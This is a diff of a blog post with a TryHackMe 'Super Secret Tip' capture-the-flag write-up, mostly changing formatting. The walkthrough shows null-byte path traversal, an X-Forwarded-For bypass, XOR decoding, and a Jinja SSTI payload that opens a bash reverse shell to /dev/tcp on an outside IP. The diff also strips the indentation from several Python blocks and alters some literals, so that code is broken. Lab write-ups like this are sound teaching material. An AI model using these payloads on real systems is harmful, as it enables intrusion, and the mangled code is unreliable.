@@ -8,11 +8,11 @@ toc: true
 
 <p class="message">Are you only good at one thing? You better be a matrix!</p>
 
-| Title | Super Secret Tip |
-| --- | --- |
-| Difficulty | Medium |
-| Authors | https://tryhackme.com/p/tryhackme and  https://tryhackme.com/p/ayhamalali |
-| Tags | security, web, python, encryption |
+| Title      | Super Secret Tip                  |
+| ---------- | --------------------------------- |
+| Difficulty | Medium                            |
+| Authors    | tryhackme & ayhamalali            |
+| Tags       | security, web, python, encryption |
 
 ## Enumeration
 
@@ -20,8 +20,8 @@ toc: true
 
 ```
 ┌──(kali㉿kali)-[~]
-└─$ sudo nmap -p- --min-rate 5000 -Pn supersecrettip.thm 
-[sudo] password for kali: 
+└─$ sudo nmap -p- --min-rate 5000 -Pn supersecrettip.thm
+[sudo] password for kali:
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-20 15:48 +07
 Nmap scan report for supersecrettip.thm (10.10.143.107)
 Host is up (0.27s latency).
@@ -35,21 +35,21 @@ Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
 
 ```
 ┌──(kali㉿kali)-[~]
-└─$ sudo nmap -sC -A -sV -Pn -p 22,7777 supersecrettip.thm 
-[sudo] password for kali: 
+└─$ sudo nmap -sC -A -sV -Pn -p 22,7777 supersecrettip.thm
+[sudo] password for kali:
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-20 15:48 +07
 Nmap scan report for supersecrettip.thm (10.10.143.107)
 Host is up (0.27s latency).
 
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 3eb818ef45a8df59bf11494b1db6b893 (RSA)
 |   256 0bcff994068597f6bdcc33664e26ea27 (ECDSA)
 |_  256 60cebe2d1ef018003070ffa266d785f7 (ED25519)
 7777/tcp open  cbt?
-| fingerprint-strings: 
-|   GetRequest: 
+| fingerprint-strings:
+|   GetRequest:
 |     HTTP/1.1 200 OK
 |     Server: Werkzeug/2.3.4 Python/3.11.0
 |     Date: Wed, 20 Dec 2023 08:48:55 GMT
@@ -76,7 +76,7 @@ PORT     STATE SERVICE VERSION
 |     <body>
 |     <div class="navbar-wrapper">
 |     <div class=
-|   Socks5: 
+|   Socks5:
 |     <!DOCTYPE HTML>
 |     <html lang="en">
 |     <head>
@@ -176,13 +176,13 @@ by Ben "epi" Risher 🤓                 ver: 2.10.1
 
 View them on web browser:
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled.png)
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled%201.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%201.png)
 
 On the `/cloud`, I try to select a random option and click on **Download** button to download the selected file but it displayed the error:
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled%202.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%202.png)
 
 Using **BurpSuite** to capture the download request, I figure out the payload might be incorrect format with redundant part `&download=`:
 
@@ -205,7 +205,7 @@ download=my-passwords.txt&download=
 
 I modify it to the correct one (I thought) and try to re-send the request but it did not work too:
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled%203.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%203.png)
 
 ```
 ┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
@@ -219,7 +219,7 @@ I modify it to the correct one (I thought) and try to re-send the request but it
 
 After testing for a while, I unintentionally figure out this file is able to be downloaded:
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled%204.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%204.png)
 
 So I using `curl` to verify it once again:
 
@@ -235,28 +235,28 @@ After analyzing the **request** and **response** via **BurpSuite**, it's evident
 
 So I’m gonna fuzz the filename with this payload request. However, I don’t know why the **fuff** tool and other similar did not work. Then I write my own simple script:
 
-```python
+{% highlight python linenos %}
 import requests
 from concurrent.futures import ThreadPoolExecutor
 
 url = "http://supersecrettip.thm:7777/cloud"
 wordlist_file = "/home/kali/Wordlists/directory-list-2.3-medium.txt"
-num_threads = 10  # Number of threads for concurrent requests
+num_threads = 10 # Number of threads for concurrent requests
 print("Fuzzing...")
 
 def send_request(file_name):
-    data = {"download": file_name + ".py"}
-    response = requests.post(url, data=data)
-    if response.status_code == 200:
-        print(f"[+]File name \"\033[1m{file_name}\"\033[0m is correct!")
+data = {"download": file_name + ".py"}
+response = requests.post(url, data=data)
+if response.status_code == 200:
+print(f"[+]File name \"\033[1m{file_name}\"\033[0m is correct!")
 
 with open(wordlist_file) as f:
-    file_names = f.readlines()
-    file_names = [name.strip() for name in file_names]
+file_names = f.readlines()
+file_names = [name.strip() for name in file_names]
 
 with ThreadPoolExecutor(max_workers=num_threads) as executor:
-    executor.map(send_request, file_names)
-```
+executor.map(send_request, file_names)
+{% endhighlight %}
 
 And this is the result:
 
@@ -272,47 +272,46 @@ And the source code I downloaded:
 
 source.py
 
-```python
-from flask import *
+{% highlight python linenos %}
+from flask import \*
 import hashlib
 import os
 import ip # from .
 import debugpassword # from .
 import pwn
 
-app = Flask(__name__)
+app = Flask(**name**)
 app.secret_key = os.urandom(32)
 password = str(open('supersecrettip.txt').readline().strip())
 
 def illegal_chars_check(input):
-    illegal = "'&;%"
-    error = ""
-    if any(char in illegal for char in input):
-        error = "Illegal characters found!"
-        return True, error
-    else:
-        return False, error
+illegal = "'&;%"
+error = ""
+if any(char in illegal for char in input):
+error = "Illegal characters found!"
+return True, error
+else:
+return False, error
 
-@app.route("/cloud", methods=["GET", "POST"]) 
+@app.route("/cloud", methods=["GET", "POST"])
 def download():
-    if request.method == "GET":
-        return render_template('cloud.html')
-    else:
-        download = request.form['download']
-        if download == 'source.py':
-            return send_file('./source.py', as_attachment=True)
-        if download[-4:] == '.txt':
-            print('download: ' + download)
-            return send_from_directory(app.root_path, download, as_attachment=True)
-        else:
-            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
-            # return render_template('cloud.html', msg="Network error occurred")
+if request.method == "GET":
+return render_template('cloud.html')
+else:
+download = request.form['download']
+if download == 'source.py':
+return send_file('./source.py', as_attachment=True)
+if download[-4:] == '.txt':
+print('download: ' + download)
+return send_from_directory(app.root_path, download, as_attachment=True)
+else:
+return send_from_directory(app.root_path + "/cloud", download, as_attachment=True) # return render_template('cloud.html', msg="Network error occurred")
 
-@app.route("/debug", methods=["GET"]) 
+@app.route("/debug", methods=["GET"])
 def debug():
-    debug = request.args.get('debug')
-    user_password = request.args.get('password')
-    
+debug = request.args.get('debug')
+user_password = request.args.get('password')
+
     if not user_password or not debug:
         return render_template("debug.html")
     result, error = illegal_chars_check(debug)
@@ -323,43 +322,43 @@ def debug():
     encrypted_pass = str(debugpassword.get_encrypted(user_password))
     if encrypted_pass != password:
         return render_template("debug.html", error="Wrong password.")
-    
-    
+
+
     session['debug'] = debug
     session['password'] = encrypted_pass
-        
+
     return render_template("debug.html", result="Debug statement executed.")
 
-@app.route("/debugresult", methods=["GET"]) 
+@app.route("/debugresult", methods=["GET"])
 def debugResult():
-    if not ip.checkIP(request):
-        return abort(401, "Everything made in home, we don't like intruders.")
-    
+if not ip.checkIP(request):
+return abort(401, "Everything made in home, we don't like intruders.")
+
     if not session:
         return render_template("debugresult.html")
-    
+
     debug = session.get('debug')
     result, error = illegal_chars_check(debug)
     if result is True:
         return render_template("debugresult.html", error=error)
     user_password = session.get('password')
-    
+
     if not debug and not user_password:
         return render_template("debugresult.html")
-        
+
     # return render_template("debugresult.html", debug=debug, success=True)
-    
+
     # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
     template = open('./templates/debugresult.html').read()
     return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
 
 @app.route("/", methods=["GET"])
 def index():
-    return render_template('index.html')
+return render_template('index.html')
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=7777, debug=False)
-```
+if **name** == "**main**":
+app.run(host="0.0.0.0", port=7777, debug=False)
+{% endhighlight %}
 
 Read a few first lines from the script, I notice that there is a file placed in the same directory with this source code which is ‘supersecrettip.txt’. So I decided to download it using `curl`:
 
@@ -373,7 +372,7 @@ Unfortunately, I cannot decode this output and do not know what it actually does
 
 ```bash
 ┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
-└─$ curl http://supersecrettip.thm:7777/cloud -X POST -d "download=debugpassword.py%00.txt"       
+└─$ curl http://supersecrettip.thm:7777/cloud -X POST -d "download=debugpassword.py%00.txt"
 import pwn
 
 def get_encrypted(passwd):
@@ -387,19 +386,19 @@ def get_encrypted(passwd):
 
 Wow, the password (`passwd`) was encrypted with **XOR** algorithm and the key is `b'[REDACTED]'`. I write a simple script based on the encryption function:
 
-```python
+{% highlight python linenos %}
 import pwn
 
 cipher = b" \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e"
 key = b'[REDACTED]'
 
 def get_decrypted(cipher):
-	return (pwn.xor(cipher, key)).decode('utf-8')
+return (pwn.xor(cipher, key)).decode('utf-8')
 
 decoded_string = get_decrypted(cipher)
 
 print(decoded_string)
-```
+{% endhighlight %}
 
 And this is the result
 
@@ -415,14 +414,14 @@ Enter the result into the **password** field:
 http://supersecrettip.thm:7777/debug?debug=%7B%7B7*7%7D%7D&password=[REDACTED]Deebugg
 ```
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled%205.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%205.png)
 
 OK, now the result is stored in the `/debugresult` path. However, the access was restricted by the IP address:
 
-```python
+{% highlight python linenos %}
 if not ip.checkIP(request):
-        return abort(401, "Everything made in home, we don't like intruders.")
-```
+return abort(401, "Everything made in home, we don't like intruders.")
+{% endhighlight %}
 
 From here, I need to get the content of the `ip` function where it was imported from the same local directory:
 
@@ -432,7 +431,7 @@ import ip # from .
 
 Use the same previous method and I get the logic:
 
-```python
+```
 ┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
 └─$ curl http://supersecrettip.thm:7777/cloud -X POST -d "download=ip.py%00.txt"
 host_ip = "127.0.0.1"
@@ -443,13 +442,13 @@ def checkIP(req):
         return req.remote_addr == host_ip
 ```
 
-It checked for the `X-Forwarded-For` if it exists in the header of the request or not. If not, it would take the remote address attribute to compare with the `host_ip` variable which is “******************127.0.0.1******************”. 
+It checked for the `X-Forwarded-For` if it exists in the header of the request or not. If not, it would take the remote address attribute to compare with the `host_ip` variable which is “**127.0.0.1**”.
 
 So I easily bypass this authentication by inserting the `X-Forwarded-For` attribute in my request within BurpSuite:
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled%206.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%206.png)
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled%207.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%207.png)
 
 From the above result, it is easily to recognize that the first input field from the `/debug` is injectable with **SSTI** (Server-side template Injection).
 
@@ -457,11 +456,11 @@ From the above result, it is easily to recognize that the first input field from
 
 I will test a simple **SSTI Payload**:
 
-```
+```python
 {{ config.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}
 ```
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled%208.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%208.png)
 
 So it worked! Now, it’s time to delivery the **RCE** payload.
 
@@ -477,7 +476,7 @@ But there is the restriction method and it does not allow the ampersand characte
 {{ config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/10.9.63.75/4444 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
 ```
 
-![Untitled](Super%20Secret%20Tip%20images/Untitled%209.png)
+![Untitled](/assets/Super%20Secret%20Tip%20images/Untitled%209.png)
 
 Start a listener on local and send the request to `/debugresult`:
 
@@ -515,7 +514,7 @@ cd
 ls -l
 total 4
 -rw-r--r-- 1 root root 32 Apr  2  2023 flag1.txt
-[REDACTED]@482cbf2305ae:~$ cat flag1.txt 
+[REDACTED]@482cbf2305ae:~$ cat flag1.txt
 THM{[REDACTED]}
 ```
 
@@ -856,16 +855,16 @@ cat flag2.txt
 b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
 ```
 
-From the `/secret-tip.txt` I found earlier, the last line was “*Don't forget it's always about root!*” → I try to re-use the previous decode Python script within `pwn.xor`, modify the key as `root` and replace the cipher with the content of `secret.txt`:
+From the `/secret-tip.txt` I found earlier, the last line was “_Don't forget it's always about root!_” → I try to re-use the previous decode Python script within `pwn.xor`, modify the key as `root` and replace the cipher with the content of `secret.txt`:
 
-```python
+{% highlight python linenos %}
 def get_decrypted(cipher):
-	return (pwn.xor(cipher, b'root')).decode('utf-8')
+return (pwn.xor(cipher, b'root')).decode('utf-8')
 
-cipher = b'C^_M@__DC\\7,'
+cipher = b'C^\_M@\_\_DC\\7,'
 decoded_string = get_decrypted(cipher)
 print(decoded_string)
-```
+{% endhighlight %}
 
 And the result:
 
@@ -875,7 +874,7 @@ And the result:
 [REDACTED]XX
 ```
 
-Notice that there are 2 ‘`X`' characters at the end of the result. Combining with the message from `/secret-tip.txt` file “*I was missing 2 .. hmm .. what were they called?*”. If I replace the cipher key with the result but without 2 ‘`X`' characters like this:
+Notice that there are 2 ‘`X`' characters at the end of the result. Combining with the message from `/secret-tip.txt` file “_I was missing 2 .. hmm .. what were they called?_”. If I replace the cipher key with the result but without 2 ‘`X`' characters like this:
 
 ```python
 def get_decrypted(cipher):
@@ -890,20 +889,20 @@ The result would be:
 THM{cronjokt^N3Eg_[REDACTED]}2g2WA`R}
 ```
 
-Oh!! It’s really close!! OK, the last step is to find the correct 2 missing characters at “`XX`" and based on the string which is only containing numeric characters, I pretty sure that the 2 last “`XX`" must be digits too. Then I write the script to brute-force the flag by replacing numbers from 0 → 9 in to “`XX`" and finding the match result which would have “THM” and “cronjobs_” inside:
+Oh!! It’s really close!! OK, the last step is to find the correct 2 missing characters at “`XX`" and based on the string which is only containing numeric characters, I pretty sure that the 2 last “`XX`" must be digits too. Then I write the script to brute-force the flag by replacing numbers from 0 → 9 in to “`XX`" and finding the match result which would have “THM” and “cronjobs\_” inside:
 
-```python
+{% highlight python linenos %}
 import pwn
 
-cipher = b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
-key = "[REDACTED]{}"  # {} is a placeholder for the XX digits
+cipher = b'ey}BQB*^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00*\x03]mD\x00W\x02gpScL'
+key = "[REDACTED]{}" # {} is a placeholder for the XX digits
 
 for i in range(100):
-    formatted_string = bytes(key.format(str(i).zfill(2)), 'utf-8')  # zfill ensures the number has two digits
-    flag_decoded = (pwn.xor(cipher,formatted_string)).decode('utf-8')
-    if "THM" in flag_decoded and "cronjobs" in flag_decoded:
-        print(f"Flag: {flag_decoded} -- Key: {formatted_string}")
-```
+formatted_string = bytes(key.format(str(i).zfill(2)), 'utf-8') # zfill ensures the number has two digits
+flag_decoded = (pwn.xor(cipher,formatted_string)).decode('utf-8')
+if "THM" in flag_decoded and "cronjobs" in flag_decoded:
+print(f"Flag: {flag_decoded} -- Key: {formatted_string}")
+{% endhighlight %}
 
 And Boom!
 
